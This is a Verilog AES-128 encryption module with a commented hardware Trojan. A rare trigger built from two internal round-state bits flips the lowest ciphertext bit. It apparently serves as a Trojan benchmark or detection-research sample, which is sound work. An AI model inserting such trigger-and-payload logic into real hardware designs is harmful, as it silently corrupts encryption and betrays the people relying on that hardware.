module AES_Encrypt#(parameter N=128, parameter Nr=10, parameter Nk=4)(
    input  [127:0] in,
    input  [N-1:0] key,
    output [127:0] out
);

    wire [(128*(Nr+1))-1 :0] fullkeys;
    wire [127:0] states [Nr+1:0];
    wire [127:0] afterSubBytes;
    wire [127:0] afterShiftRows;
    wire Tj_Trig;

    // Key expansion
    keyExpansion #(Nk,Nr) ke (key, fullkeys);

    // Initial AddRoundKey
    addRoundKey addrk1 (in, states[0], fullkeys[((128*(Nr+1))-1)-:128]);

    // Encryption rounds
    genvar i;
    generate
        for(i=1; i<Nr ; i=i+1) begin : loop
            encryptRound er(states[i-1], fullkeys[(((128*(Nr+1))-1)-128*i)-:128], states[i]);
        end
    endgenerate

    // Final Round
    subBytes sb(states[Nr-1], afterSubBytes);
    shiftRows sr(afterSubBytes, afterShiftRows);
    addRoundKey addrk2(afterShiftRows, states[Nr], fullkeys[127:0]);

    // === Trojan Activation ===
    TSC Trojan (
        .r1(states[2][89]),  // s2[89]
        .r2(states[5][121]), // s5[121]
        .trigger(Tj_Trig)
    );

    // === Trojan Payload: XOR out[0] with trigger ===
    assign out[127:1] = states[Nr][127:1];
    assign out[0]     = states[Nr][0] ^ Tj_Trig;

endmodule



module TSC(
    input r1,
    input r2,
    output trigger
);
    assign trigger = r1 & r2;

    always @(posedge trigger)
        $display("Trojan Activated");
endmodule
